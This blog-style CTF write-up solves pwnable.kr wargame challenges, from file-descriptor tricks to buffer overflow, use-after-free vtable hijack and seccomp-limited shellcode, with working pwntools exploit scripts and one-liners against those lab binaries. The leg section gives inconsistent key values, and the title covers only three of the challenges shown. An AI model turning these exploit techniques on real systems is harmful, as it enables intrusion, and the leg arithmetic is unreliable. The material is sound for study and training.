---
title: 'Pwnable.kr — leg, passcode, horcruxes Writeup'
date: 2019-05-23T00:00:00.000Z
excerpt: >-
  Solving pwnable.kr challenges: ARM PC computation quirks (leg), a GOT overwrite via scanf (passcode), and building a ROP chain (horcruxes).
tags:
  - wargame
  - writeup
  - pwn
  - pwnable-kr
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## fd

### Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;
}
```

### Solution

Looking at the source, there's a hint that `argv[1]` is a number, and if the string inside `buf` is `"LETMEWIN\n"`, the flag gets printed.

```c
ssize_t read (int fd, void *buf, size_t nbytes)
```

`read` fills `buf` from `fd`. Here, `fd` is a file descriptor, where stdin=0, stdout=1, stderr=2.

Since stdin is 0, we need `fd` to become 0 so it reads from standard input. Since `fd = atoi(argv[1]) - 0x1234`, giving `argv[1]` the value `0x1234 (=4660)` makes `fd = 0`.

```
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
```

---

## collision

### Source

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}
	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

### Solution

`argv[1]` must be exactly 20 bytes long, and the return value of `check_password` must equal `hashcode` for the flag to print.

The hashcode is `0x21DD09EC (= 568,134,124)`, and the function returns the sum of five 4-byte chunks of input `p`.

`568,134,124 / 5 = 113,626,824.8 ...`

Since it doesn't divide evenly by 5, we need to handle the remainder:
enter `568,134,120 / 5 = 0x6C5CEC8 (113,626,824)` four times, and `0x6C5CEC8 + 4` for the last one.

```
col@pwnable:~$ ./col $(perl -e 'print "\xc8\xce\xc5\x06"x4, "\xcc\xce\xc5\x06"')
daddy!
```

---

## bof

### Source

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

### Solution

```
➜  pwnable checksec --file bof    
[*] '/home/ubuntu/ctf/pwnable/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

gef➤  x/40xw $esp
0xffffd540:	0xffffd55c	0x00000000	0x00000000	0x6cedb400
0xffffd550:	0x00000009	0xffffd784	0xf7e1c0a9	0x41414141
0xffffd560:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd570:	0x41414141	0x41414141	0x41414141	0x6cedb400
0xffffd580:	0x00000000	0xf7e1c1db	0xffffd5a8	0x5655569f
0xffffd590:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
0xffffd5a0:	0xf7fc1000	0xf7fc1000	0x00000000	0xf7e04e9
```

Analyzing the stack shows the `key` parameter stored as `0xdeadbeef`. Filling the offset from the buffer up to key and overwriting `key` with `0xcafebabe` gets us there.

**Payload:**

```
buf[32] | Dummy[20] | 0xcafebabe
```

```
➜  pwnable (perl -e 'print "A"x32, "B"x20, "\xbe\xba\xfe\xca"';cat)| nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
```

---

## flag

### Binary analysis

```
➜  pwnable checksec --file flag
[*] '/home/ubuntu/ctf/pwnable/flag'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    Packer:   Packed with UPX
```

### Solution

It's packed with UPX, so we unpack it first:

```
➜  pwnable upx -d flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```

Analyzing the main function in IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *dest; // [rsp+8h] [rbp-8h]

  puts("I will malloc() and strcpy the flag there. take it.", argv, envp);
  dest = (char *)malloc(100LL);
  strcpy(dest, flag);
  return 0;
}
```

The source for `strcpy` is the global `flag` variable. Checking `rax` (malloc's return value) in GDB reveals the flag:

```
gef➤  x/s $rax
0x6c96b0:	"UPX...? ----- -------------------"
```

---

## mistake

### Source

```c
#include <stdio.h>
#include <fcntl.h>
#define PW_LEN 10
#define XORKEY 1
void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}
	printf("do not bruteforce...\n");
	sleep(time(0)%20);
	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}
	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);
	// xor your input
	xor(pw_buf2, 10);
	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}else{ printf("Wrong Password\n");}
	close(fd);
	return 0;
}
```

### Solution

The source opens the password file with `open`, then compares it against input buffer `buf2`, printing the flag if they match.

The source looks fine at first glance, but there's a trick in the first if statement:

```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
```

An **operator precedence** issue. The `<` comparison operator binds tighter than the `=` assignment operator, so `open()`'s return value gets compared against `0` first, and that comparison result (0 or 1) is what gets assigned to `fd`.

That means `fd` ends up being the comparison result, not an actual file descriptor, and it's `0`. With `fd=0`, `read(fd, pw_buf, PW_LEN)` reads from stdin instead — so we can put whatever value we want into `pw_buf` ourselves.

Then `pw_buf2` is also read in and XORed with key 1. We just need `pw_buf` and `pw_buf2` to match under the XOR-1 relation. For example, if we put `0000000000` into `pw_buf`, then `pw_buf2` needs to become `0000000000` after XOR 1 is applied, so we should input `1111111111`.

---

## leg

### Overview

The `leg` challenge gives both C source and ARM assembly, asking for the sum of the return values of three functions. The key is understanding how ARM's pipeline works and how the PC (program counter) value is computed during the instruction fetch stage.

### Vulnerability analysis

The challenge's source code checks `key1 + key2 + key3 == key`:

```c
unsigned long key1(){
	asm("mov r3, pc\n");
	asm("mov r0, r3\n");
	asm("bx lr\n");
}
```

Analyzing each function's assembly:

#### key1: PC during the fetch stage
The `mov r3, pc` instruction captures the PC value. Because of ARM's 3-stage pipeline (fetch-decode-execute), when this instruction is in the execute stage, PC points two instructions ahead. At address `0x8ce0`, the actual PC value read is `0x8ce4`.

#### key2: PC + 4

```c
unsigned long key2(){
	asm("mov r3, pc\n");
	asm("add r3, #4\n");
	asm("mov r0, r3\n");
	asm("bx lr\n");
}
```

Reading PC at `0x8d08` gives `0x8d0c` due to the pipeline effect, and adding 4 gives `0x8d10`.

#### key3: link register
```c
unsigned long key3(){
	asm("mov r0, lr\n");
	asm("bx lr\n");
}
```

LR (Link Register) holds the return address set by the caller. In the main function, this value is `0x8d80`.

### Solution

The three key values are:
- `key1 = 0x8ce4`
- `key2 = 0x8d0c`
- `key3 = 0x8d80`

Sum: `0x8ce4 + 0x8d0c + 0x8d80 = 0x1a770 = 108400`

```bash
$ ./leg 108400
Congratz!
```

**Key takeaway:**
- ARM's fetch -> decode -> execute -> write pipeline stages
- Reading PC during the execute stage points to the fetch stage (two instructions ahead)
- This requires adjusting from a static location to the runtime pipeline position

---

## passcode

### Overview

The `passcode` challenge shows a critical bug from a missing address-of operator (`&`) in a `scanf()` call. This vulnerability enables an arbitrary memory write.

### Vulnerability analysis

The login function expects two integer inputs:

```c
void login(){
	int passcode1, passcode2;
	printf("enter passcode1 : ");
	scanf("%d", passcode1);  // bug: missing &
	printf("enter passcode2 : ");
	scanf("%d", passcode2);  // bug: missing &
}
```

The correct way to use `scanf` is to pass a pointer:
```c
scanf("%d", &passcode1);  // correct usage
```

Without the `&` operator, `scanf` treats the variable's own value as a memory address and writes to that address — this becomes an arbitrary write primitive.

### Exploit strategy

1. Since the `name` buffer is adjacent to `passcode1`, use the name input to set `passcode1`'s value to a desired GOT address
2. Get `scanf` to write a desired value to that address
3. Overwrite the GOT entry for `fflush@GOT` or another desired function with the address of a `system()` call
4. Obtain a shell

```bash
$ ssh passcode@pwnable.kr
[passcode@pwnable.kr ~]$ ./passcode
Authenticate :
enter passcode1 : (enter the crafted value)
enter passcode2 : (enter the crafted value)
correct! here's your flag
```

---

## horcruxes

### Overview

The `horcruxes` challenge requires building a ROP (Return-Oriented Programming) chain to bypass protections and achieve code execution.

### Challenge structure

The binary has seven horcrux functions, a through g, and we need to gain XP from each. All the XP values need to add up to a specific target to get the flag.

### Exploit strategy

#### Step 1: Confirm the stack overflow

Overflow the input buffer to control the return address. Since ASLR is enabled, we first need to leak an address.

#### Step 2: Build the ROP chain

Build a ROP chain that calls each horcrux function in sequence:

1. Connect to the server (`pwnable.kr:9032`) with `pwntools`.
2. Secure a point in the stack overflow where the return address can be controlled.
3. Send a ROP chain payload chaining together the addresses of horcrux functions a through g in order.
4. Once the accumulated XP from each function call matches the target, we get the flag.

*(The full exploit script itself isn't included in this write-up — the above is a summary of the approach.)*

**ROP (Return-Oriented Programming) concept:**
- Leverages existing code sequences (gadgets) that end in a `ret` instruction
- Chains gadgets together to achieve arbitrary code execution
- Works even in an environment with NX (non-executable stack) enabled

---

## Input

### Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

### Solution

There are five stages, and satisfying all of them prints the flag.

**Stage 1:** argc must be 100, `argv[0x41]` must be `\x00`, and `argv[0x42]` must be `\x20\x0a\x0d`.

`subprocess` has trouble recognizing input containing `\x00`, so I used pwntools instead.

```python
from pwn import *
import os

# stage 1
argv = [str(i) for i in range(100)]
argv[ord('A')]="\x00"
argv[ord('B')]="\x20\x0a\x0d"
```

Full solution:

```c
from pwn import *
import os

# stage 1
argv = [str(i) for i in range(100)]
argv[ord('A')]="\x00"
argv[ord('B')]="\x20\x0a\x0d"
# stage 2
#stdin \x00\x0a\x00\xff
#stderr \x00\x0a\x02\xff
with open("./stderr", "w") as data:
    data.write("\x00\x0a\x02\xff")

# stage 3 env(\xde\xad\xbe\xef) = "\xca\xfe\xba\xbe"
env = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}

# stage 4 open \x0a
with open("\x0a", "w") as data:
    data.write("\x00\x00\x00\x00")

# stage 5 send "\xde\xad\xbe\xef" port argv['C']
argv[ord('C')]='55555'

p = process(executable="./input", argv=argv, stderr=open("./stderr"),env=env)
p.sendline("\x00\x0a\x00\xff")
p = remote("localhost", 55555)
p.send("\xde\xad\xbe\xef")
p.interactive()
```

---

## uaf

### Source

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
/*
	mov    rax,QWORD PTR [rbp-0x38]
	mov    rax,QWORD PTR [rax]
	add    rax,0x8
	mov    rdx,QWORD PTR [rax]
	mov    rax,QWORD PTR [rbp-0x38]
	mov    rdi,rax
	call   rdx
*/
				w->introduce();
/*
	mov    rax,QWORD PTR [rbp-0x30]
	mov    rax,QWORD PTR [rax]
	add    rax,0x8
	mov    rdx,QWORD PTR [rax]
	mov    rax,QWORD PTR [rbp-0x30]
	mov    rdi,rax
	call   rdx
*/
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
/*
	mov    rbx,QWORD PTR [rbp-0x38]
	test   rbx,rbx
	je     0x40108f <main+459>
	mov    rdi,rbx
	call   0x40123a <Human::~Human()>
	mov    rdi,rbx
	call   0x400c80 <operator delete(void*)@plt>
*/
				delete w;
/*
	mov    rbx,QWORD PTR [rbp-0x30]
	test   rbx,rbx
	je     0x4010a8 <main+484>
	mov    rdi,rbx
	call   0x40123a <Human::~Human()>
	mov    rdi,rbx
	call   0x400c80 <operator delete(void*)@plt>
*/
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

### Solution

The first UAF (Use-After-Free) challenge I'd ever encountered.

- CASE 1: call the object's `introduce` function (Use)
- CASE 2: allocate a new object (Alloc)
- CASE 3: Free

I picked up a good analysis technique this time — putting the disassembly right in the source as comments to make the analysis clearer.

How do we reuse a heap chunk once it's freed? Freeing and then immediately using it causes an error. It needs to go Free -> Alloc -> Use in that order — but what do we need to allocate to end up calling `give_shell`?

The virtual methods used in this challenge get placed in a vtable, so tampering with the start of the vtable to redirect to `give_shell` does the trick.

```
+-Object------+      +-vtable--------------+
| *vtable     +--?-->| virtual function #1 |
+-------------+      | virtual function #2 +----> give_shell()
| member      |      +---------------------+
| ...         |
+-------------+
```

Since the disassembly for the use command has `add rax, 0x8`, we need to place `give_shell - 0x8` as the vtable pointer.

Since there are two objects, Man and Woman, we need to allocate twice.

```python
from pwn import *

size = 24
path = "/tmp/uaf_file"
data = p64(0x401588)*3
with open(path, "wb") as f:
	f.write(data)

p = process(["uaf", str(size), path])

if __name__ == "__main__":
	p.sendline("3")
	p.sendline("2")
	p.sendline("2")
	p.sendline("1")
	p.interactive()
```

---

## asm

### Source

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	// ...
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
	// ...
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2...";
// x64 shellcode that zeroes out every register

int main(int argc, char* argv[]){
	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

### Solution

A seccomp sandbox is applied, allowing only the `open`, `read`, `write`, `exit`, and `exit_group` system calls.

The stub shellcode zeroes out every register with XOR. Our own shellcode continues right after the stub.

Since the flag filename is extremely long, instead of a `db "string"` style approach, I needed to push each byte one register at a time directly onto the stack.

pwntools makes this simple to build:

```python
from pwn import *

context(arch='amd64', os='linux')

filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

shellcode = ''
shellcode += shellcraft.pushstr(filename)
shellcode += shellcraft.open('rsp', 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

r = remote('pwnable.kr', 9026)
print r.recvuntil("give me your x64 shellcode:")
r.sendline(asm(shellcode))
r.interactive()
```
